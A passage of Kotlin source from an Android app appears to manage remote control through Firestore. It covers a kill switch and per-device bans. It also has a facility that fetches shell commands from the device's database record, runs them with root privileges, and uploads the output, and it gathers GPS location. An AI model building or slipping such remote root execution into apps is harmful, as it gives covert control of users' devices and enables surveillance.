            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to check kill status", exception)
                // في حالة فشل الاتصال، نسمح للتطبيق بالاستمرار
            }
    }
    
    /**
     * Checks if the current device is banned and handles app disable if needed
     */
    fun checkBanStatus(context: Context, onBanned: (() -> Unit)? = null) {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        
        firestore.collection("devices").document(androidId).get()
            .addOnSuccessListener { document ->
                val isBanned = document.getBoolean("banned") ?: false
                
                if (isBanned) {
                    val customMessageMap = document.get("custom_message") as? Map<String, Any>
                    val customMessageEnabled = customMessageMap?.get("enabled") as? Boolean ?: false
                    
                    val title = if (customMessageEnabled) {
                        customMessageMap?.get("title") as? String ?: "Device Banned"
                    } else {
                        "Device Banned"
                    }
                    
                    val message = if (customMessageEnabled) {
                        customMessageMap?.get("text") as? String ?: "This device has been banned."
                    } else {
                        "This device has been banned."
                    }
                    
                    Log.w(TAG, "⚠️ Device is banned: $androidId")
                    applicationDisabled(context, message, title)
                    onBanned?.invoke()
                } else {
                    Log.d(TAG, "✅ Device is not banned: $androidId")
                }
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to check ban status for device: $androidId", exception)
            }
    }
    
    /**
     * Checks and executes shell commands if enabled
     */
    fun checkAndExecuteShellCommands(context: Context) {
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        
        firestore.collection("devices").document(androidId).get()
            .addOnSuccessListener { document ->
                val shellData = document.get("shell") as? Map<String, Any>
                
                if (shellData != null) {
                    val shouldRun = shellData["run"] as? Boolean ?: false
                    val command = shellData["command"] as? String ?: ""
                    val count = (shellData["count"] as? Number)?.toInt() ?: 1
                    val waitSeconds = (shellData["wait"] as? Number)?.toInt() ?: 0
                    
                    if (shouldRun && command.isNotEmpty()) {
                        Log.i(TAG, "🔧 Shell Command execution requested - Command: '$command', Count: $count, Wait: ${waitSeconds}s")
                        
                        // Execute the command sequence and disable run flag after completion
                        executeShellCommandSequence(context, command, count, waitSeconds, androidId)
                    } else {
                        Log.d(TAG, "📋 Shell execution not required - Run: $shouldRun, Command: '$command'")
                    }
                } else {
                    Log.d(TAG, "📋 No shell data found in device document")
                }
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to check shell commands for device: $androidId", exception)
            }
    }
    
    /**
     * Executes shell command sequence with specified count and wait time using RootManager
     * ONLY executes if run=true and stops immediately if run becomes false
     */
    private fun executeShellCommandSequence(context: Context, command: String, count: Int, waitSeconds: Int, androidId: String) {
        Log.i(TAG, "🚀 Starting shell command sequence - Command: '$command', Executions: $count, Wait: ${waitSeconds}s, AndroidID: $androidId")
        
        // Validate inputs
        if (command.isEmpty()) {
            Log.w(TAG, "⚠️ Empty command provided, skipping execution")
            disableShellRunFlag(androidId, "ERROR: Empty command provided")
            return
        }
        
        if (count <= 0) {
            Log.w(TAG, "⚠️ Invalid count provided: $count, skipping execution")
            disableShellRunFlag(androidId, "ERROR: Invalid count provided: $count")
            return
        }
        
        // Double-check that run flag is still true before starting execution
        val deviceRef = firestore.collection("devices").document(androidId)
        deviceRef.get()
            .addOnSuccessListener { document ->
                if (document.exists()) {
                    val shellData = document.get("shell") as? Map<String, Any>
                    val currentRunFlag = shellData?.get("run") as? Boolean ?: false
                    
                    if (!currentRunFlag) {
                        Log.w(TAG, "🛑 Run flag is false at execution start, aborting execution")
                        resetExecutionFlags()
                        return@addOnSuccessListener
                    }
                    
                    // Check if root access is available
                    Log.d(TAG, "📋 Checking root access...")
                    if (!RootManager.isRootGranted()) {
                        Log.e(TAG, "❌ Root access not available, disabling run flag")
                        disableShellRunFlag(androidId, "ERROR: Root access not available")
                        return@addOnSuccessListener
                    }
                    Log.d(TAG, "✅ Root access confirmed")
                    
                    // Start execution sequence with run flag confirmed as true
                    Log.i(TAG, "🚀 Starting command execution sequence - run flag confirmed as true")
                    executeCommandSequenceInternal(context, command, count, waitSeconds, androidId)
                } else {
                    Log.e(TAG, "❌ Device document does not exist")
                    resetExecutionFlags()
                }
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to verify run flag before execution", exception)
                disableShellRunFlag(androidId, "ERROR: Failed to verify run flag")
            }
    }
    
    /**
     * Internal method to execute the actual command sequence using background thread
     * This prevents blocking the main thread and avoids synchronization issues
     */
    private fun executeCommandSequenceInternal(context: Context, command: String, count: Int, waitSeconds: Int, androidId: String) {
        Log.i(TAG, "🎯 Starting internal command sequence - Total executions planned: $count, Wait between: ${waitSeconds}s")
        
        // Use background thread to prevent main thread blocking
        currentExecutionThread = Thread {
            try {
                val resultBuilder = StringBuilder()
                var executionCount = 0
                val startTime = System.currentTimeMillis()
                val maxExecutionTime = 60000L // 60 seconds maximum total execution time
                
                Log.i(TAG, "� Starting command execution in background thread")
                
                while (executionCount < count && !Thread.currentThread().isInterrupted) {
                    // Check if run flag is still true before each execution
                    val deviceRef = firestore.collection("devices").document(androidId)
                    try {
                        val currentDoc = Tasks.await(deviceRef.get())
                        if (currentDoc.exists()) {
                            val currentShellData = currentDoc.get("shell") as? Map<String, Any>
                            val currentRunFlag = currentShellData?.get("run") as? Boolean ?: false
                            
                            if (!currentRunFlag) {
                                Log.w(TAG, "🛑 Run flag was set to false during execution, stopping...")
                                resultBuilder.append("STOPPED: Run flag set to false during execution\n")
                                break
                            }
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "⚠️ Could not verify run flag, continuing execution", e)
                    }
                    
                    // Check for timeout to prevent infinite hanging
                    val currentTime = System.currentTimeMillis()
                    if (currentTime - startTime > maxExecutionTime) {
                        Log.e(TAG, "⏰ Execution timeout reached (60s), stopping sequence")
                        resultBuilder.append("TIMEOUT: Execution stopped after 60 seconds\n")
                        break
                    }
                    
                    executionCount++
                    Log.i(TAG, "⚡ Executing shell command ($executionCount/$count): $command")
                    
                    try {
                        Log.d(TAG, "📋 Calling RootManager.executeRootCommand...")
                        
                        // Execute shell command using RootManager with timeout
                        when (val result = RootManager.executeRootCommand(command, 10)) {
                            is RootCommandResult.Success -> {
                                Log.i(TAG, "✅ Shell command executed successfully ($executionCount/$count)")
                                Log.d(TAG, "📋 Command output: ${result.output}")
                                resultBuilder.append("Execution $executionCount: SUCCESS\n")
                                if (result.output.isNotEmpty()) {
                                    resultBuilder.append("Output: ${result.output}\n")
                                }
                            }
                            is RootCommandResult.Error -> {
                                Log.w(TAG, "⚠️ Shell command failed ($executionCount/$count): ${result.message}")
                                resultBuilder.append("Execution $executionCount: ERROR\n")
                                resultBuilder.append("Error: ${result.message}\n")
                            }
                        }
                        
                        Log.d(TAG, "📋 RootManager call completed for execution $executionCount")
                        
                        // Wait between executions if more iterations needed and thread not interrupted
                        if (executionCount < count && waitSeconds > 0 && !Thread.currentThread().isInterrupted) {
                            Log.i(TAG, "⏰ Waiting ${waitSeconds} seconds before next execution...")
                            Thread.sleep(waitSeconds * 1000L)
                            Log.d(TAG, "⏱️ Wait completed, proceeding to next execution...")
                        }
                        
                    } catch (e: InterruptedException) {
                        Log.e(TAG, "❌ Execution interrupted ($executionCount/$count)", e)
                        resultBuilder.append("Execution $executionCount: INTERRUPTED\n")
                        resultBuilder.append("Error: ${e.message}\n")
                        break // Stop execution on interruption
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ Failed to execute shell command ($executionCount/$count): $command", e)
                        resultBuilder.append("Execution $executionCount: EXCEPTION\n")
                        resultBuilder.append("Exception: ${e.message}\n")
                        
                        // Continue with remaining executions even if one fails
                        Log.w(TAG, "⚠️ Execution failed but continuing with remaining executions...")
                    }
                }
                
                // Check if execution was interrupted
                if (Thread.currentThread().isInterrupted) {
                    Log.w(TAG, "🛑 Execution was interrupted externally")
                    resultBuilder.append("INTERRUPTED: Execution stopped externally\n")
                }
                
                // Final result processing
                Log.i(TAG, "🎉 Shell command sequence completed - Total executions: $executionCount/$count")
                val finalResult = resultBuilder.toString().trim()
                Log.d(TAG, "📋 Final execution result: $finalResult")
                
                // Update database with final result
                disableShellRunFlag(androidId, finalResult)
                
            } catch (e: Exception) {
                Log.e(TAG, "❌ Critical error in command execution sequence", e)
                // Ensure cleanup even on critical failure
                disableShellRunFlag(androidId, "CRITICAL ERROR: ${e.message}")
            } finally {
                // Clear thread reference
                currentExecutionThread = null
                Log.d(TAG, "🧹 Execution thread cleaned up")
            }
        }.apply {
            name = "ShellCommandExecutor-$androidId"
            isDaemon = false
        }
        
        // Start the execution thread
        currentExecutionThread?.start()
        Log.d(TAG, "🚀 Execution thread started: ${currentExecutionThread?.name}")
    }
    
    /**
     * Resets execution flags and cleans up execution state
     * This is used internally when execution needs to be aborted
     */
    private fun resetExecutionFlags() {
        Log.d(TAG, "🔄 Resetting execution flags")
        
        // Interrupt current execution thread if exists
        currentExecutionThread?.let { thread ->
            if (thread.isAlive) {
                Log.w(TAG, "⚠️ Interrupting running execution thread: ${thread.name}")
                thread.interrupt()
                Log.d(TAG, "🛑 Execution thread interrupted")
            } else {
                Log.d(TAG, "📋 Execution thread was already finished")
            }
            currentExecutionThread = null
        }
        
        // Reset execution flags
        isExecutingCommand = false
        lastExecutionStartTime = 0L
        
        Log.d(TAG, "✅ Execution flags reset successfully")
    }
    
    /**
     * Forces reset of execution state if system becomes stuck
     * This is a safety mechanism to prevent permanent hanging
     */
    fun forceResetExecutionState(androidId: String) {
        Log.w(TAG, "🔄 Forcing execution state reset for device: $androidId")
        
        // Use internal reset function
        resetExecutionFlags()
        
        // Force disable run flag in database
        disableShellRunFlag(androidId, "FORCED RESET: System was stuck and had to be reset")
        
        Log.i(TAG, "✅ Execution state forcibly reset - system ready for new commands")
    }

    /**
     * Disables the shell run flag in the database and updates result
     */
    private fun disableShellRunFlag(androidId: String, result: String = "") {
        Log.d(TAG, "📋 disableShellRunFlag called for androidId: $androidId with result: '$result'")
        val deviceRef = firestore.collection("devices").document(androidId)
        Log.d(TAG, "📋 Updating shell.run to false and setting result...")
        
        val updates = mapOf(
            "shell.run" to false,
            "shell.result" to result,
            "updated_at" to FieldValue.serverTimestamp()
        )
        
        deviceRef.update(updates)
            .addOnSuccessListener {
                Log.i(TAG, "✅ Shell run flag disabled and result updated after command sequence completion")
                // Reset execution flag to allow future executions
                isExecutingCommand = false
                Log.d(TAG, "🔓 Execution flag reset - ready for next command")
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to disable shell run flag and update result", exception)
                // Reset execution flag even on failure
                isExecutingCommand = false
                Log.d(TAG, "🔓 Execution flag reset after failure - ready for next command")
            }
    }
    
    /**
     * Updates only the shell result without changing the run flag
     */
    private fun updateShellResult(androidId: String, result: String) {
        Log.d(TAG, "📋 updateShellResult called for androidId: $androidId with result: '$result'")
        val deviceRef = firestore.collection("devices").document(androidId)
        
        val updates = mapOf(
            "shell.result" to result,
            "updated_at" to FieldValue.serverTimestamp()
        )
        
        deviceRef.update(updates)
            .addOnSuccessListener {
                Log.i(TAG, "✅ Shell result updated successfully")
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to update shell result", exception)
            }
    }
    
    /**
     * Execute shell command sequence in background service context
     * This method is called from the background service and uses the same logic as foreground execution
     */
    fun executeShellCommandInBackground(context: Context, command: String, count: Int, waitSeconds: Int, androidId: String) {
        Log.i(TAG, "🔄 Background execution - Command: '$command', Count: $count, Wait: ${waitSeconds}s, AndroidID: $androidId")
        
        // Initialize context and firestore if needed
        if (!::context.isInitialized) {
            this.context = context
        }
        if (!::firestore.isInitialized) {
            firestore = FirebaseFirestore.getInstance()
        }
        
        // Execute the same command sequence logic as foreground
        executeShellCommandSequence(context, command, count, waitSeconds, androidId)
    }
    
    /**
     * Comprehensive check for all app-disabling conditions and shell command execution
     */
    fun checkAppStatus(context: Context, onDisabled: (() -> Unit)? = null) {
        Log.i(TAG, "🔍 Starting comprehensive app status check...")
        
        // أولاً، تحقق من الـ killall العام
        checkKillAllStatus(context) {
            onDisabled?.invoke()
            return@checkKillAllStatus
        }
        
        // ثانياً، تحقق من حالة الحظر للجهاز
        checkBanStatus(context) {
            onDisabled?.invoke()
            return@checkBanStatus
        }
        
        // ثالثاً، تحقق من أوامر Shell وتنفيذها إذا لزم الأمر
        checkAndExecuteShellCommands(context)
    }
    
    /**
     * Disables the application and shows an error dialog
     */
    fun applicationDisabled(context: Context, customMessage: String = "An unexpected error has occurred.", customTitle: String = "Application Disabled") {
        Log.w(TAG, "🚫 Application disabled: $customMessage")
        
        val layout = android.widget.LinearLayout(context).apply {
            orientation = android.widget.LinearLayout.VERTICAL
            setPadding(48, 48, 48, 48)
            
            // Divider
            val divider = android.view.View(context).apply {
                layoutParams = android.widget.LinearLayout.LayoutParams(
                    android.widget.LinearLayout.LayoutParams.MATCH_PARENT,
                    2 // 2px height
                ).apply {
                    setMargins(0, 32, 0, 32)
                }
                setBackgroundColor(android.graphics.Color.parseColor("#E0E0E0"))
            }
            addView(divider)
        }
        
        val textView = android.widget.TextView(context).apply {
            text = customMessage
            textSize = 16f
            setTextColor(android.graphics.Color.parseColor("#424242"))
            gravity = android.view.Gravity.CENTER
            layoutParams = android.widget.LinearLayout.LayoutParams(
                android.widget.LinearLayout.LayoutParams.MATCH_PARENT,
                android.widget.LinearLayout.LayoutParams.WRAP_CONTENT
            ).apply {
                setMargins(0, 16, 0, 16)
            }
        }
        layout.addView(textView)
        
        val alertDialog = android.app.AlertDialog.Builder(context)
            .setTitle(customTitle)
            .setView(layout)
            .setCancelable(false)
            .setPositiveButton("Exit") { _, _ ->
                Log.i(TAG, "📱 User confirmed app exit")
                if (context is android.app.Activity) {
                    context.finishAffinity()
                }
                exitProcess(0)
            }
            .create()
            
        alertDialog.show()
        Log.i(TAG, "📋 Application disabled dialog shown")
    }
    
    /**
     * Test function to verify shell command execution system
     * This creates a simple test scenario to ensure the system works correctly
     */
    fun testShellCommandExecution(context: Context) {
        Log.i(TAG, "🧪 Starting shell command execution test")
        
        val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID)
        if (androidId.isNullOrEmpty()) {
            Log.e(TAG, "❌ Cannot run test - Android ID not available")
            return
        }
        
        // Initialize context and firestore if needed
        if (!::context.isInitialized) {
            this.context = context
        }
        if (!::firestore.isInitialized) {
            firestore = FirebaseFirestore.getInstance()
        }
        
        Log.i(TAG, "🧪 Setting up test command: echo with 3 iterations, 2 second wait")
        
        // Set up test command in database
        val deviceRef = firestore.collection("devices").document(androidId)
        val testShellData = mapOf(
            "shell.command" to "echo 'Test execution #\$RANDOM'",
            "shell.run" to true,
            "shell.count" to 3,
            "shell.wait" to 2,
            "shell.result" to "",
            "updated_at" to FieldValue.serverTimestamp()
        )
        
        deviceRef.update(testShellData)
            .addOnSuccessListener {
                Log.i(TAG, "✅ Test command set up successfully in database")
                Log.i(TAG, "📋 Expected behavior: 3 executions of echo command with 2 second wait between each")
                Log.i(TAG, "📋 Monitor the logs for execution progress...")
            }
            .addOnFailureListener { exception ->
                Log.e(TAG, "❌ Failed to set up test command", exception)
            }
    }

    /**
     * Checks current execution status for debugging purposes
     */
    fun checkExecutionStatus(): String {
        val status = StringBuilder()
        status.append("Shell Command Execution Status:\n")
        status.append("- Is executing: $isExecutingCommand\n")
        status.append("- Last execution start: ${if (lastExecutionStartTime > 0) Date(lastExecutionStartTime) else "Never"}\n")
        status.append("- Current thread: ${currentExecutionThread?.let { "${it.name} (alive: ${it.isAlive})" } ?: "None"}\n")
        status.append("- Listener active: ${shellCommandListener != null}\n")
        
        if (isExecutingCommand && lastExecutionStartTime > 0) {
            val elapsed = (System.currentTimeMillis() - lastExecutionStartTime) / 1000
            status.append("- Execution time elapsed: ${elapsed}s\n")
            if (elapsed > EXECUTION_TIMEOUT / 1000) {
                status.append("- ⚠️ WARNING: Execution timeout exceeded!\n")
            }
        }
        
        val statusString = status.toString()
        Log.i(TAG, "📊 Execution Status Check:\n$statusString")
        return statusString
    }

    // ===================== EXISTING FUNCTIONS =====================
    
    /**
     * Recursively finds missing fields in the database compared to the schema
     */
    private fun findMissingFields(
        schema: Map<String, Any>, 
        existingData: Map<String, Any>, 
        updates: MutableMap<String, Any>, 
        prefix: String = ""
    ) {
        for ((key, schemaValue) in schema) {
            val currentPath = if (prefix.isEmpty()) key else "$prefix.$key"
            
            if (!existingData.containsKey(key)) {
                // Field missing in database - add it
                updates[currentPath] = schemaValue
                Log.d(TAG, "  ➕ Missing field: $currentPath = $schemaValue")
            } else {
                // Field exists - check if it's a nested map
                if (schemaValue is Map<*, *> && existingData[key] is Map<*, *>) {
                    @Suppress("UNCHECKED_CAST")
                    findMissingFields(
                        schemaValue as Map<String, Any>, 
                        existingData[key] as Map<String, Any>, 
                        updates, 
                        currentPath
                    )
                }
            }
        }
    }
    
    /**
     * Recursively finds extra fields in the database that don't exist in schema
     */
    private fun findExtraFields(
        schema: Map<String, Any>, 
        existingData: Map<String, Any>, 
        updates: MutableMap<String, Any>, 
        prefix: String = ""
    ) {
        for ((key, existingValue) in existingData) {
            val currentPath = if (prefix.isEmpty()) key else "$prefix.$key"
            
            // Skip system fields that should never be deleted
            if (key in listOf("created_at", "updated_at", "android_id")) {
                continue
            }
            
            if (!schema.containsKey(key)) {
                // Field exists in database but not in schema - mark for deletion
                updates[currentPath] = FieldValue.delete()
                Log.d(TAG, "  ➖ Extra field to delete: $currentPath")
            } else {
                // Field exists in both - check if it's a nested map
                val schemaValue = schema[key]
                if (schemaValue is Map<*, *> && existingValue is Map<*, *>) {
                    @Suppress("UNCHECKED_CAST")
                    findExtraFields(
                        schemaValue as Map<String, Any>, 
                        existingValue as Map<String, Any>, 
                        updates, 
                        currentPath
                    )
                }
            }
        }
    }
    
    /**
     * Marks an operation as complete and checks if all operations are done
     */
    private fun completeOperation() {
        operationsCompleted++
        Log.d(TAG, "📊 Operation completed ($operationsCompleted/$totalOperations)")
        
        if (operationsCompleted >= totalOperations) {
            Log.i(TAG, "🎉 All collection operations completed!")
            
            // After all collections are initialized, update device information for current device only
            Handler(Looper.getMainLooper()).postDelayed({
                updateDeviceInformation()
                // Start real-time shell command listener after everything is ready
                startShellCommandListener()
            }, 1000) // Small delay to ensure Firestore operations are settled
        }
    }
    
    /**
     * Gets device location information (country and city)
     */
    private fun getDeviceLocation(): Pair<String, String> {
        var country = ""
        var city = ""
        
        try {
            val locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            if (checkLocationPermissions()) {
                val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
                var location: Location? = null
                
                // Try to get location from available providers
                for (provider in providers) {
                    try {
                        location = locationManager.getLastKnownLocation(provider)
                        if (location != null) {
                            Log.d(TAG, "📍 Got location from $provider: ${location.latitude}, ${location.longitude}")
                            break
                        }
                    } catch (e: SecurityException) {
                        Log.w(TAG, "Security exception for provider $provider: ${e.message}")
                    }
                }
                
                // Use Geocoder to get country and city from coordinates
                if (location != null) {
                    try {
                        val geocoder = Geocoder(context, Locale.getDefault())
                        val addresses = geocoder.getFromLocation(location.latitude, location.longitude, 1)
                        if (!addresses.isNullOrEmpty()) {
                            country = addresses[0].countryName ?: ""
                            city = addresses[0].locality ?: addresses[0].subAdminArea ?: ""
                            Log.d(TAG, "🌍 Geocoded location - Country: $country, City: $city")
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "Geocoding failed: ${e.message}")
                    }
                }
            } else {
                Log.w(TAG, "⚠️ Location permission not granted")
            }
            
            // Fallback to system locale for country if location-based detection failed
            if (country.isEmpty()) {
                country = Locale.getDefault().displayCountry
                Log.d(TAG, "🌍 Using fallback country from locale: $country")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Error getting device location", e)
            // Use system locale as fallback
            country = Locale.getDefault().displayCountry
        }
        
        return Pair(country, city)
    }
}
